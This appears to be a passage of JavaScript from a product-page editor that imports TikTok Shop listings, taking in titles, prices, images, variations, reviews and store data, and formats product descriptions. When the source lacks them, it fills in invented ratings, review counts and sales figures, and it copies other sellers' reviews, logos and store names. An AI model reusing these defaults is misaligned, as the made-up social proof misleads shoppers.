// =====================================================
// INTEGRACAO COM EXTENSAO TIKTOK SHOP EXTRACTOR
// =====================================================

// Variavel global para armazenar dados da extensao
window.tiktokExtractorData = null;

// =====================================================
// Injeta campos que a funcao addRecommendation original NAO cria,
// mas que o gerador de output JA LE (via classes especificas):
//   .rec-product-rating  -> Nota (ex: 4.8)
//   .rec-review-count     -> Nº de avaliacoes
//   .rec-sales-count      -> Nº de vendas
//   .rec-additional-images-> Galeria (URLs separadas por virgula)
//   .rec-store-name        -> Nome da loja deste produto
//   .rec-store-logo        -> Logo da loja deste produto
//   .rec-store-sales       -> Vendidos da loja deste produto
// Cada recomendacao agora tem sua PROPRIA loja (nao herda mais do principal).
// =====================================================
window.injetarCamposExtrasRecomendacao = function(item, recData) {
    // Se o addRecommendation antigo nao retornou o item, pega o ultimo do container
    if (!item) {
        var cont = document.getElementById('recommendation-items');
        if (cont) {
            var todos = cont.querySelectorAll('.item-editor');
            if (todos.length > 0) item = todos[todos.length - 1];
        }
    }
    if (!item) {
        console.log('[v0] injetarCamposExtras: item de recomendacao nao encontrado');
        return;
    }
    
    // Helper: cria input se nao existir e define o valor
    function setOrCreate(cls, valor, isTextarea) {
        var campo = item.querySelector('.' + cls);
        if (campo) {
            campo.value = valor != null ? valor : '';
            return campo;
        }
        return null; // sera criado no bloco visual abaixo
    }
    
    // FALLBACK DE REVIEWS: se a versao do addRecommendation nao populou os reviews,
    // adiciona manualmente via addRecReview (mesma funcao do editor).
    var revContainer = item.querySelector('.rec-reviews-container');
    var revBtn = item.querySelector('.add-btn[onclick*="addRecReview"]');
    var jaTemReviews = item.querySelectorAll('.rec-reviews-container .rec-review-item').length;
    console.log('[v0] Reviews ja no item:', jaTemReviews, '| Reviews a adicionar:', (recData.reviews || []).length);
    
    if (recData.reviews && recData.reviews.length > 0 && typeof addRecReview === 'function' && revBtn) {
        // Remove o review default ("Maria Silva") se houver apenas ele e nos temos reviews reais
        if (jaTemReviews <= 1 && revContainer) {
            revContainer.innerHTML = '';
        }
        if (item.querySelectorAll('.rec-reviews-container .rec-review-item').length === 0) {
            recData.reviews.forEach(function(rev) {
                var revItem = addRecReview(revBtn, rev);
                if (revItem && typeof setupLiveUpdateListeners === 'function') {
                    setupLiveUpdateListeners(revItem);
                }
            });
            console.log('[v0] Reviews injetados manualmente:', recData.reviews.length);
        }
    }
    
    // Galeria de imagens adicionais (output faz split por virgula)
    var galeriaStr = (recData.additionalImages && recData.additionalImages.length > 0)
        ? recData.additionalImages.join(', ')
        : '';
    
    // Imagens e videos da descricao (output faz split por virgula)
    var descMediaStr = (recData.descriptionImages && recData.descriptionImages.length > 0)
        ? recData.descriptionImages.join(', ')
        : '';
    
    // Se a secao ja foi injetada antes, apenas atualiza
    if (item.querySelector('.rec-extra-fields')) {
        setOrCreate('rec-product-rating', recData.productRating);
        setOrCreate('rec-review-count', recData.reviewCount);
        setOrCreate('rec-sales-count', recData.salesCount);
        setOrCreate('rec-additional-images', galeriaStr, true);
        setOrCreate('rec-description-images', descMediaStr, true);
        setOrCreate('rec-store-name', recData.storeName);
        setOrCreate('rec-store-logo', recData.storeLogoUrl);
        setOrCreate('rec-store-sales', recData.storeSales);
        return;
    }
    
    // Bloco visual com os campos faltantes
    var bloco = document.createElement('div');
    bloco.className = 'rec-extra-fields';
    bloco.style.cssText = 'margin-top:12px; background:#fafafa; padding:10px; border-radius:5px; border:1px solid #eee;';
    bloco.innerHTML =
        '<h5 style="margin-top:0; font-size:13px;">Dados de Reputacao</h5>' +
        '<div style="display:flex; gap:8px; margin-bottom:8px;">' +
            '<div style="flex:1;">' +
                '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Nota (ex: 4.8)</label>' +
                '<input type="text" class="rec-product-rating" placeholder="4.8" value="' + (recData.productRating || '') + '" style="width:100%;">' +
            '</div>' +
            '<div style="flex:1;">' +
                '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Nº Avaliacoes</label>' +
                '<input type="text" class="rec-review-count" placeholder="150" value="' + (recData.reviewCount || '') + '" style="width:100%;">' +
            '</div>' +
            '<div style="flex:1;">' +
                '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Nº Vendas</label>' +
                '<input type="text" class="rec-sales-count" placeholder="1000" value="' + (recData.salesCount || '') + '" style="width:100%;">' +
            '</div>' +
        '</div>' +
        '<h5 style="margin:10px 0 5px 0; font-size:13px;">Dados da Loja</h5>' +
        '<div style="display:flex; gap:8px; margin-bottom:8px;">' +
            '<div style="flex:2;">' +
                '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Nome da Loja</label>' +
                '<input type="text" class="rec-store-name" placeholder="Nome da loja" value="' + (recData.storeName || '') + '" style="width:100%;">' +
            '</div>' +
            '<div style="flex:1;">' +
                '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Vendidos da Loja</label>' +
                '<input type="text" class="rec-store-sales" placeholder="1698" value="' + (recData.storeSales || '') + '" style="width:100%;">' +
            '</div>' +
        '</div>' +
        '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">URL da Logo da Loja</label>' +
        '<input type="text" class="rec-store-logo" placeholder="https://..." value="' + (recData.storeLogoUrl || '') + '" style="width:100%; margin-bottom:8px;">' +
        '<label style="font-size:10px; font-weight:bold; color:#666; display:block;">Galeria de Imagens (URLs separadas por virgula)</label>' +
        '<textarea class="rec-additional-images" placeholder="url1, url2, url3..." style="width:100%; height:50px; font-size:11px;">' + galeriaStr + '</textarea>' +
        '<label style="font-size:10px; font-weight:bold; color:#666; display:block; margin-top:8px;">Imagens/Videos da Descricao (URLs separadas por virgula)</label>' +
        '<textarea class="rec-description-images" placeholder="url1, video.mp4, url3..." style="width:100%; height:50px; font-size:11px;">' + descMediaStr + '</textarea>';
    
    // Insere logo apos a descricao (ou no fim do item se nao achar)
    var descArea = item.querySelector('.rec-description');
    if (descArea && descArea.parentElement) {
        descArea.parentElement.insertAdjacentElement('afterend', bloco);
    } else {
        item.appendChild(bloco);
    }
    
    // Ativa atualizacao ao vivo nos novos campos
    if (typeof setupLiveUpdateListeners === 'function') {
        setupLiveUpdateListeners(bloco);
    }
};

// Funcao global para importar da extensao (chamada pelo botao)
window.importarDaExtensao = function(tipo) {
    tipo = tipo || 'principal';
    
    navigator.clipboard.readText().then(function(text) {
        console.log('[v0] Clipboard lido:', text.substring(0, 200));
        
        try {
            var data = JSON.parse(text);
            console.log('[v0] JSON parseado:', data);
            
            if (data.source === 'tiktok-shop-extractor') {
                var tipoFinal = tipo === 'recomendacao' ? 'recomendacao' : (data.type || 'principal');
                importarProdutoDaExtensao(data.data, tipoFinal);
            } else if (data.product) {
                importarProdutoDaExtensao(data, tipo);
            } else {
                alert('Formato invalido. Use a extensao para copiar o produto primeiro.');
            }
        } catch (err) {
            console.error('[v0] Erro ao parsear JSON:', err);
            alert('Nenhum dado valido no clipboard.\n\nPasso 1: Va na pagina do TikTok Shop\nPasso 2: Clique na extensao\nPasso 3: Clique em Copiar\nPasso 4: Volte aqui e clique no botao');
        }
    }).catch(function(err) {
        console.error('[v0] Erro ao ler clipboard:', err);
        alert('Nao foi possivel acessar o clipboard.\n\nTente:\n1. Permitir acesso ao clipboard\n2. Usar HTTPS\n3. Colar manualmente no campo de HTML');
    });
};

// Decide se uma variacao e de TAMANHO (vai para addSize) ou COR (vai para addColor).
// Regras, em ordem de confianca:
//   1) Se as opcoes tem imagem -> e COR (tamanhos nunca tem imagem no TikTok).
//   2) Se o nome bate com termos de tamanho -> e TAMANHO.
//   3) Se a maioria dos valores parecem tamanho (P/M/G, 33/34, numeros) -> e TAMANHO.
function ehVariacaoDeTamanho(variation) {
    if (!variation) return false;
    var nome = variation.name || '';
    var opcoes = variation.options || [];

    // 1) Tem imagem em alguma opcao? Entao e COR, nunca tamanho.
    var temImagem = opcoes.some(function (o) {
        return o && o.image && String(o.image).trim() !== '';
    });
    if (temImagem) return false;

    // 2) Nome claramente de tamanho
    if (/tamanho|\bsize\b|\btam\b|n[uú]mero|numera[cç]|medida/i.test(nome)) return true;

    // 3) Nome claramente de cor/estampa -> nao e tamanho
    if (/^cor(es)?$|color|colour|estampa|^padr[aã]o$/i.test(nome.trim())) return false;

    // 4) Analise dos VALORES: a maioria parece tamanho?
    if (opcoes.length > 0) {
        var padraoTamanho = /^(PP|P|M|G|GG|XG|XGG|XS|S|L|XL|XXL|XXXL|U|UNICO|[0-9]{1,3}([\/.\-x][0-9]{1,3})?|EU\s?[0-9]+|BR\s?[0-9]+|[0-9]+\s?(cm|mm|ml|m|kg|g|l|polegadas?))$/i;
        var qtdTamanho = 0;
        opcoes.forEach(function (o) {
            var v = (o && o.name ? String(o.name) : '').trim();
            if (v && padraoTamanho.test(v)) qtdTamanho++;
        });
        if (qtdTamanho >= Math.ceil(opcoes.length * 0.6)) return true;
    }

    return false;
}

// Importar produto da extensao para o editor
function importarProdutoDaExtensao(data, tipo) {
    try {
        var p = data.product || data;
        console.log('[v0] Importando produto:', p);
        console.log('[v0] Tipo:', tipo);
        
        if (tipo === 'principal') {
            // ========== PREENCHER CAMPOS DO PRODUTO PRINCIPAL ==========
            
            // Titulo
            setFieldValue('product-title', p.title);
            
            // Precos
            setFieldValue('current-price', limparPrecoExtensao(p.price));
            setFieldValue('original-price', limparPrecoExtensao(p.originalPrice));
            
            // Imagem principal - tentar varios campos possiveis
            var mainImg = p.mainImage || (p.images && p.images.length > 0 ? p.images[0] : '');
            if (mainImg) {
                setFieldValue('main-image', mainImg);
            }
            
            // Imagens adicionais
            if (p.images && p.images.length > 1) {
                setFieldValue('additional-images', p.images.slice(1).join(', '));
            }
            
            // Descricao
            if (p.description) {
                setFieldValue('product-description', p.description);
            }
            
            // Imagens e VIDEOS da descricao (campo "URLs Imagens Descricao" no painel Midia)
            var descMedia = [];
            if (p.descriptionImages && p.descriptionImages.length) descMedia = descMedia.concat(p.descriptionImages);
            if (p.descriptionVideos && p.descriptionVideos.length) descMedia = descMedia.concat(p.descriptionVideos);
            descMedia = descMedia.filter(function(u){ return u && String(u).trim(); });
            if (descMedia.length > 0) {
                setFieldValue('description-images', descMedia.join(', '));
                console.log('[v0] Midia da descricao importada:', descMedia.length, 'item(s)');
            }
            
            // Rating
            setFieldValue('product-rating', p.rating || '4.8');
            
            // Numero de avaliacoes
            if (p.reviewCount) {
                setFieldValue('review-count', p.reviewCount);
            }
            
            // Vendidos
            var vendidos = p.soldCount || p.salesCount || p.sold || '';
            if (vendidos) {
                setFieldValue('sales-count', vendidos.toString().replace(/[^\d]/g, ''));
            }
            
            // Loja
            if (p.shopName) {
                setFieldValue('store-name', p.shopName);
            }
            if (p.shopLogo) {
                setFieldValue('store-logo-url', p.shopLogo);
            }
            
            // ========== VARIACOES (CORES e TAMANHOS) ==========
            if (p.variations && p.variations.length > 0) {
                console.log('[v0] VARIACOES RECEBIDAS:', p.variations.length);
                p.variations.forEach(function(v, i) {
                    console.log('[v0] Variacao', i, ':', v.name, '| opcoes:', v.options ? v.options.length : 0);
                    if (v.options && v.options.length > 0) {
                        console.log('[v0]   sample opts:', v.options.slice(0,3).map(function(o){return o.name + (o.image?'(img)':'')}).join(', '));
                    }
                    console.log('[v0]   ehTamanho?', ehVariacaoDeTamanho(v));
                });
                
                // Limpar containers
                var colorContainer = document.getElementById('color-options');
                var sizeContainer = document.getElementById('size-options');
                if (colorContainer) colorContainer.innerHTML = '';
                if (sizeContainer) sizeContainer.innerHTML = '';
                
                // Atualizar titulos das variacoes se existirem
                p.variations.forEach(function(variation, idx) {
                    var isTamanho = ehVariacaoDeTamanho(variation);
                    console.log('[v0] PROCESSANDO:', variation.name, '| isTamanho:', isTamanho, '| opcoes:', variation.options ? variation.options.length : 0);
                    
                    // Atualizar titulo da variacao no painel
                    if (isTamanho) {
                        setFieldValue('variation2-title', variation.name || 'Tamanhos');
                        console.log('[v0] -> Setando titulo Tamanhos e chamando addSize');
                    } else {
                        setFieldValue('variation1-title', variation.name || 'Cores');
                        console.log('[v0] -> Setando titulo Cores e chamando addColor');
                    }
                    
                    if (variation.options && variation.options.length > 0) {
                        variation.options.forEach(function(opt) {
                            if (isTamanho) {
                                // ========== ADICIONA COMO TAMANHO ==========
                                console.log('[v0] Adicionando TAMANHO:', opt.name);
                                if (typeof addSize === 'function') {
                                    var sizeItem = addSize(opt.name || '');
                                    if (sizeItem && typeof setupLiveUpdateListeners === 'function') {
                                        setupLiveUpdateListeners(sizeItem);
                                    }
                                } else {
                                    // Fallback: adicionar manualmente ao container de tamanhos
                                    var sizeContainer = document.getElementById('size-options');
                                    if (sizeContainer) {
                                        var sizeEl = document.createElement('div');
                                        sizeEl.className = 'size-option';
                                        sizeEl.textContent = opt.name || '';
                                        sizeContainer.appendChild(sizeEl);
                                        console.log('[v0] Fallback: adicionado ao size-options');
                                    }
                                }
                            } else {
                                // ========== ADICIONA COMO COR ==========
                                console.log('[v0] Adicionando COR:', opt.name, opt.image ? '(com img)' : '(sem img)');
                                if (typeof addColor === 'function') {
                                    var colorItem = addColor({
                                        imageUrl: opt.image || '',
                                        name: opt.name || '',
                                        price: limparPrecoExtensao(p.price),
                                        checkoutUrl: ''
                                    });
                                    if (colorItem && typeof setupLiveUpdateListeners === 'function') {
                                        setupLiveUpdateListeners(colorItem);
                                    }
                                }
                            }
                        });
                    }
                });
            }
            
            // ========== AVALIACOES ==========
            if (p.reviews && p.reviews.length > 0) {
                var reviewContainer = document.getElementById('review-items');
                if (reviewContainer) reviewContainer.innerHTML = '';
                
                p.reviews.slice(0, 5).forEach(function(review, idx) {
                    if (typeof addReview === 'function') {
                        var reviewData = {
                            name: review.author || review.name || 'Cliente ' + (idx + 1),
                            avatarUrl: review.avatar || '',
                            details: review.variant || 'Item: Padrao',
                            stars: review.rating || review.stars || 5,
                            text: review.text || review.content || '',
                            image: review.images && review.images.length > 0 ? review.images[0] : '',
                            images: review.images && review.images.length > 0 ? review.images : []
                        };
                        var reviewItem = addReview(reviewData);
                        if (reviewItem && typeof setupLiveUpdateListeners === 'function') {
                            setupLiveUpdateListeners(reviewItem);
                        }
                    }
                });
            }
            
            mostrarNotificacaoExtensao('Produto principal importado!', 'success');
            
        } else if (tipo === 'recomendacao') {
            // ========== ADICIONAR COMO RECOMENDACAO ==========
            if (typeof addRecommendation === 'function') {
                
                // Converter variations para colors e sizes (formato esperado pela funcao addRecommendation)
                var colors = [];
                var sizes = [];
                var variation1Title = 'Cor';
                var variation2Title = 'Tamanho';
                
                if (p.variations && p.variations.length > 0) {
                    p.variations.forEach(function(variation) {
                        // Detecta se e tamanho usando a mesma logica do produto principal
                        var isTamanho = typeof ehVariacaoDeTamanho === 'function' 
                            ? ehVariacaoDeTamanho(variation) 
                            : /tamanho|size|tam\b|numero|number/i.test(variation.name || '');
                        
                        if (isTamanho) {
                            variation2Title = variation.name || 'Tamanho';
                            if (variation.options && variation.options.length > 0) {
                                variation.options.forEach(function(opt) {
                                    sizes.push(opt.name || opt);
                                });
                            }
                        } else {
                            variation1Title = variation.name || 'Cor';
                            if (variation.options && variation.options.length > 0) {
                                variation.options.forEach(function(opt) {
                                    colors.push({
                                        name: opt.name || '',
                                        imageUrl: opt.image || '',
                                        price: '',
                                        checkoutUrl: ''
                                    });
                                });
                            }
                        }
                    });
                }
                
                // Formatar reviews - MESMO mapeamento do produto principal (campos da extensao)
                var formattedReviews = [];
                if (p.reviews && p.reviews.length > 0) {
                    p.reviews.slice(0, 5).forEach(function(review, idx) {
                        formattedReviews.push({
                            name: review.author || review.name || 'Cliente ' + (idx + 1),
                            avatarUrl: review.avatar || review.avatarUrl || '',
                            details: review.variant || review.details || 'Item: Padrao',
                            stars: review.rating || review.stars || 5,
                            text: review.text || review.content || '',
                            image: review.images && review.images.length > 0 ? review.images[0] : (review.image || ''),
                            images: review.images && review.images.length > 0 ? review.images : (review.image ? [review.image] : [])
                        });
                    });
                }
                
                // Imagens adicionais (galeria) - output le como string separada por virgula
                var additionalImages = (p.images && p.images.length > 1) ? p.images.slice(1) : [];
                
                // Imagens e videos da descricao do produto recomendado
                var recDescMedia = [];
                if (p.descriptionImages && p.descriptionImages.length) recDescMedia = recDescMedia.concat(p.descriptionImages);
                if (p.descriptionVideos && p.descriptionVideos.length) recDescMedia = recDescMedia.concat(p.descriptionVideos);
                recDescMedia = recDescMedia.filter(function(u){ return u && String(u).trim(); });
                
                // Valores de nota / avaliacoes / vendas (limpa para so numeros quando possivel)
                var ratingVal = p.rating ? String(p.rating).replace(',', '.') : '4.9';
                var reviewCountVal = p.reviewCount ? String(p.reviewCount).replace(/[^\d]/g, '') : (formattedReviews.length || '15');
                var salesCountVal = (p.soldCount || p.salesCount || p.sold || '');
                salesCountVal = salesCountVal ? String(salesCountVal) : '100';
                
                // Dados da LOJA do produto recomendado (cada produto tem sua propria loja)
                var storeNameVal = p.shopName || p.storeName || p.sellerName || '';
                var storeLogoVal = p.shopLogo || p.storeLogoUrl || p.sellerAvatar || '';
                // Vendidos da loja: usa campo de loja se existir, senao o soldCount do produto
                var storeSalesRaw = p.storeSales || p.shopSales || p.shopSold || p.sellerSold || p.soldCount || p.salesCount || '';
                var storeSalesVal = storeSalesRaw ? String(storeSalesRaw).replace(/[^\d]/g, '') : '';
                
                // Envia dados no formato correto para addRecommendation
                var recData = {
                    // Dados basicos
                    productTitle: p.title,
                    currentPrice: limparPrecoExtensao(p.price),
                    originalPrice: limparPrecoExtensao(p.originalPrice),
                    mainImage: p.mainImage || (p.images && p.images.length > 0 ? p.images[0] : ''),
                    productDescription: p.description || '',
                    productUrl: 'rec-' + Date.now(),
                    
                    // Variacoes no formato correto
                    colors: colors,
                    sizes: sizes,
                    variation1Title: variation1Title,
                    variation2Title: variation2Title,
                    
                    // Reviews formatados
                    reviews: formattedReviews,
                    
                    // Campos extras (lidos pelo output via classes especificas)
                    additionalImages: additionalImages,
                    descriptionImages: recDescMedia,
                    productRating: ratingVal,
                    reviewCount: reviewCountVal,
                    salesCount: salesCountVal,
                    
                    // Dados da loja deste produto recomendado
                    storeName: storeNameVal,
                    storeLogoUrl: storeLogoVal,
                    storeSales: storeSalesVal
                };
                
                console.log('[v0] Recomendacao com dados formatados:', recData);
                console.log('[v0] Colors:', colors.length, 'Sizes:', sizes.length, 'Reviews:', formattedReviews.length);
                
                // Cria o item de recomendacao (funcao original do editor)
                var novoRecItem = addRecommendation(recData);
                
                // A funcao original NAO cria os campos de nota/avaliacoes/vendas/galeria.
                // O gerador de output ja LE essas classes, entao injetamos os campos com os valores.
                // Chamamos SEMPRE (mesmo sem retorno) - a funcao localiza o ultimo item sozinha.
                injetarCamposExtrasRecomendacao(novoRecItem, recData);
                
                if (typeof updateOutput === 'function') updateOutput();
                else if (typeof updateOutputDebounced === 'function') updateOutputDebounced();
                
                mostrarNotificacaoExtensao('Recomendacao adicionada com todos os dados!', 'success');
            } else {
                alert('Funcao addRecommendation nao encontrada. Verifique o script.');
            }
        }
        
        // Atualizar preview
        if (typeof updateOutput === 'function') {
            setTimeout(updateOutput, 100);
        }
        
    } catch (e) {
        console.error('[v0] Erro ao importar:', e);
        mostrarNotificacaoExtensao('Erro ao importar: ' + e.message, 'error');
    }
}

// Definir valor de um campo pelo ID
function setFieldValue(fieldId, value) {
    if (!value) return;
    var el = document.getElementById(fieldId);
    if (el) {
        el.value = value;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        console.log('[v0] Campo preenchido:', fieldId, '=', value.substring ? value.substring(0, 50) : value);
    } else {
        console.warn('[v0] Campo nao encontrado:', fieldId);
    }
}

// Limpar preco (remover R$, espacos, etc)
function limparPrecoExtensao(preco) {
    if (!preco) return '';
    return preco.toString()
        .replace(/R\$\s*/g, '')
        .replace(/\$/g, '')
        .replace(/\s/g, '')
        .replace(',', '.')
        .trim();
}

// Mostrar notificacao
function mostrarNotificacaoExtensao(mensagem, tipo) {
    var notifAnterior = document.querySelector('.extensao-notificacao');
    if (notifAnterior) notifAnterior.remove();
    
    var cor = tipo === 'success' ? '#25f4ee' : '#fe2c55';
    var icone = tipo === 'success' ? '✓' : '✗';
    
    var notif = document.createElement('div');
    notif.className = 'extensao-notificacao';
    notif.style.cssText = 'position:fixed;top:20px;right:20px;background:#1a1a1a;border:2px solid '+cor+';color:#fff;padding:16px 24px;border-radius:12px;z-index:99999;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:14px;box-shadow:0 4px 20px rgba(0,0,0,0.5);display:flex;align-items:center;gap:10px;';
    notif.innerHTML = '<span style="color:'+cor+';font-size:18px;">'+icone+'</span><span>'+mensagem+'</span>';
    
    document.body.appendChild(notif);
    
    setTimeout(function() {
        notif.remove();
    }, 4000);
}

// Os botoes de importacao ja sao renderizados estaticamente no PHP.
// (Injecao via JS removida para evitar bloco duplicado.)

// =====================================================
// FIM DA INTEGRACAO COM EXTENSAO
// =====================================================

// --- FUNCAO PARA FORMATAR DESCRICAO COM HTML BONITO ---
function formatDescriptionHtml(textLines) {
  if (!textLines || textLines.length === 0) return '';
  
  // Palavras-chave que indicam titulos/cabecalhos (devem ficar em negrito e centralizados)
  const titleKeywords = [
    'Informações Técnicas', 'Informacoes Tecnicas', 'Especificações', 'Especificacoes',
    'Características', 'Caracteristicas', 'Detalhes', 'Descrição', 'Descricao',
    'Sobre o Produto', 'Sobre o produto', 'Ficha Técnica', 'Ficha Tecnica',
    'Material', 'Composição', 'Composicao', 'Medidas', 'Dimensões', 'Dimensoes'
  ];
  
  // Palavras-chave que indicam propriedades (devem ficar em negrito antes do :)
  const propertyKeywords = [
    'Numeração disponível', 'Numeracao disponivel', 'Forma', 'Altura', 'Detalhe',
    'Traseiro', 'Palmilha', 'SOLADO', 'Solado', 'Bico', 'Cor', 'Tamanho',
    'Material', 'Composição', 'Composicao', 'Peso', 'Largura', 'Comprimento',
    'Tecido', 'Forro', 'Salto', 'Sola', 'Fecho', 'Bolsos', 'Modelo', 'Estilo',
    'Ocasião', 'Ocasiao', 'Gênero', 'Genero', 'Estação', 'Estacao', 'Marca'
  ];
  
  let formattedLines = [];
  
  textLines.forEach((line, index) => {
    let trimmed = line.trim();
    if (!trimmed) return;
    
    // Verificar se e um titulo/cabecalho
    let isTitle = false;
    for (const keyword of titleKeywords) {
      if (trimmed.toLowerCase().includes(keyword.toLowerCase()) && trimmed.length < 60) {
        isTitle = true;
        break;
      }
    }
    
    if (isTitle) {
      // Titulo: negrito, centralizado, com espacamento
      formattedLines.push('<br>');
      formattedLines.push('<center><b>' + trimmed + '</b></center>');
      formattedLines.push('<br>');
      return;
    }
    
    // Verificar se e uma propriedade com valor (ex: "Altura do Salto: 4,5 cm")
    let hasProperty = false;
    for (const keyword of propertyKeywords) {
      if (trimmed.startsWith(keyword) || trimmed.toLowerCase().startsWith(keyword.toLowerCase())) {
        hasProperty = true;
        // Colocar a parte antes do : em negrito
        if (trimmed.includes(':')) {
          const parts = trimmed.split(':');
          const propName = parts[0].trim();
          const propValue = parts.slice(1).join(':').trim();
          trimmed = '<b>' + propName + ':</b> ' + propValue;
        } else {
          // Se nao tem :, colocar tudo em negrito
          trimmed = '<b>' + trimmed + '</b>';
        }
        break;
      }
    }
    
    // Se a linha contem : e nao foi processada, verificar se parece uma propriedade
    if (!hasProperty && trimmed.includes(':') && !trimmed.includes('http')) {
      const colonIndex = trimmed.indexOf(':');
      const beforeColon = trimmed.substring(0, colonIndex).trim();
      // Se a parte antes do : e curta e nao tem muitas palavras, e uma propriedade
      if (beforeColon.length < 40 && beforeColon.split(' ').length <= 5) {
        const afterColon = trimmed.substring(colonIndex + 1).trim();
        if (afterColon) {
          trimmed = '<b>' + beforeColon + ':</b> ' + afterColon;
        }
      }
    }
    
    // Verificar se e um paragrafo longo (descritivo) - centralizar
    if (trimmed.length > 100 && !trimmed.includes('<b>')) {
      formattedLines.push('<br>');
      formattedLines.push('<center>' + trimmed + '</center>');
      return;
    }
    
    formattedLines.push(trimmed);
  });
  
  // Juntar com quebras de linha HTML
  let result = formattedLines.join('<br>\n');
  
  // Limpar multiplos <br> consecutivos
  result = result.replace(/(<br>\s*){3,}/gi, '<br><br>');
  
  // Adicionar espacamento no inicio
  if (!result.startsWith('<br>') && !result.startsWith('<center>')) {
    result = '<br>' + result;
  }
  
  return result;
}

// --- FUNCAO EXTRAIR DO HTML DO TIKTOK ---
function extractFromTikTokHtml() {
  const input = document.getElementById('tiktok-html-input');
  const status = document.getElementById('tiktok-html-status');
  
  if (!input || !input.value.trim()) {
    alert('Cole o HTML da pagina do TikTok Shop no campo de texto.');
    return;
  }
  
  const html = input.value;
  if (status) status.innerText = 'Processando HTML...';
  
  try {
    // Criar um parser DOM
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const fullText = doc.body ? doc.body.textContent : html;
    
    // Extrair titulo
    let title = '';
    const titleSelectors = ['[data-e2e="product-title"]', 'h1', '[class*="ProductTitle"]', '[class*="product-title"]', 'title'];
    for (const sel of titleSelectors) {
      const el = doc.querySelector(sel);
      if (el && el.textContent.trim().length > 5) {
        title = el.textContent.trim();
        break;
      }
    }
    
    // Extrair precos
    let currentPrice = '';
    let originalPrice = '';
    const priceMatches = fullText.match(/R\$\s*[\d,.]+/g) || [];
    if (priceMatches.length >= 1) {
      currentPrice = priceMatches[0].replace(/[^\d,]/g, '');
    }
    if (priceMatches.length >= 2) {
      originalPrice = priceMatches[1].replace(/[^\d,]/g, '');
    }
    
    // Tentar extrair o JSON __MODERN_ROUTER_DATA__ que contem TODOS os dados do produto
    let routerData = null;
    let jsonProductDesc = '';
    let jsonDescImages = [];
    let jsonVariants = [];
    
    try {
      const jsonMatch = html.match(/<script[^>]*id="__MODERN_ROUTER_DATA__"[^>]*>([\s\S]*?)<\/script>/i);
      if (jsonMatch && jsonMatch[1]) {
        routerData = JSON.parse(jsonMatch[1]);
        // Navegar pela estrutura do JSON para encontrar os dados do produto
        const pageData = routerData?.loaderData?.['(name$)/(id)/page'] || 
                         routerData?.loaderData?.page ||
                         routerData?.loaderData || {};
        
        // Descricao completa
        const productInfo = pageData?.productInfo || pageData?.product || pageData?.data?.productInfo || {};
        const descObj = productInfo?.description || productInfo?.productDescription || {};
        
        if (typeof descObj === 'string') {
          jsonProductDesc = descObj;
        } else if (descObj?.text) {
          jsonProductDesc = descObj.text;
        } else if (descObj?.content) {
          jsonProductDesc = descObj.content;
        }
        
        // Imagens da descricao
        if (descObj?.imageList) {
          jsonDescImages = descObj.imageList.map(img => img?.url || img).filter(Boolean);
        } else if (descObj?.images) {
          jsonDescImages = descObj.images.map(img => img?.url || img).filter(Boolean);
        }
        
        // Variantes (skus) - tentar varios caminhos possiveis no JSON do TikTok
        const specList = productInfo?.skuSpecList || productInfo?.specList || 
                         pageData?.skuSpecList || pageData?.specList || [];
        
        // Buscar primeiro pelos specs (estrutura mais comum do TikTok)
        specList.forEach(spec => {
          const specName = (spec?.name || spec?.specName || '').toLowerCase();
          // Pegar apenas specs de cor (nao tamanho)
          if (specName.includes('cor') || specName.includes('color') || specName.includes('colour') || specName === '') {
            const values = spec?.values || spec?.specValues || spec?.options || [];
            values.forEach(val => {
              const colorName = val?.name || val?.value || val?.specValue || '';
              const colorImg = val?.imgUrl || val?.image || val?.thumbUrl || val?.img || '';
              if (colorName) {
                jsonVariants.push({
                  name: colorName,
                  imageUrl: colorImg
                });
              }
            });
          }
        });
        
        // Fallback: buscar por "specList" dentro de cada SKU
        if (jsonVariants.length === 0) {
          const skuList = productInfo?.skuList || productInfo?.skus || pageData?.skuList || [];
          const colorMap = new Map(); // Usar Map para evitar duplicatas
          
          skuList.forEach(sku => {
            const specs = sku?.specList || sku?.specs || [];
            let colorName = '';
            
            // Encontrar o spec de cor
            specs.forEach(s => {
              const sName = (s?.specName || s?.name || '').toLowerCase();
              if (sName.includes('cor') || sName.includes('color')) {
                colorName = s?.specValue || s?.value || '';
              }
            });
            
            // Se encontrou cor, associar com a imagem do SKU
            if (colorName) {
              const skuImg = sku?.thumbUrl || sku?.image || sku?.imgUrl || '';
              if (!colorMap.has(colorName)) {
                colorMap.set(colorName, {
                  name: colorName,
                  imageUrl: skuImg
                });
              }
            }
          });
          
          // Converter Map para array
          jsonVariants = Array.from(colorMap.values());
        }
      }
    } catch(e) {
      // JSON nao encontrado ou invalido, usar fallback de regex
    }
    
    // Arrays para imagens extraidas
    const productImages = [];
    const reviewClientImages = [];
    const avatarImages = [];
    
    // Decodificar HTML entities primeiro
    const decodedHtml = html
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&#039;/g, "'");
    
    // Funcao para classificar imagem pela URL
    function classifyImage(url) {
      // Imagem de produto: resize-webp:800:800 (imagens grandes do carrossel)
      if (url.includes('resize-webp:800:800') || url.includes('800x800')) {
        return 'product';
      }
      // Avatar: cropcenter:100:100 (fotos de perfil dos usuarios)
      if (url.includes('cropcenter:100:100') || url.includes('cropcenter') || (url.includes('tiktokcdn') && url.includes('avt'))) {
        return 'avatar';
      }
      // Imagem de review: crop-webp:300:300 (fotos do produto recebido pelo cliente)
      if (url.includes('crop-webp:300:300') || url.includes('crop-webp')) {
        return 'review';
      }
      return null;
    }
    
    // Buscar URLs em data-src (imagens lazy-load)
    const dataSrcRegex = /data-src="([^"]+\.(?:webp|jpg|jpeg|png|gif)[^"]*)"/gi;
    const foundUrls = new Set();
    let match;
    
    while ((match = dataSrcRegex.exec(decodedHtml)) !== null) {
      const url = match[1];
      if (url && !foundUrls.has(url)) {
        foundUrls.add(url);
        const type = classifyImage(url);
        if (type === 'product') productImages.push(url);
        else if (type === 'avatar') avatarImages.push(url);
        else if (type === 'review') reviewClientImages.push(url);
      }
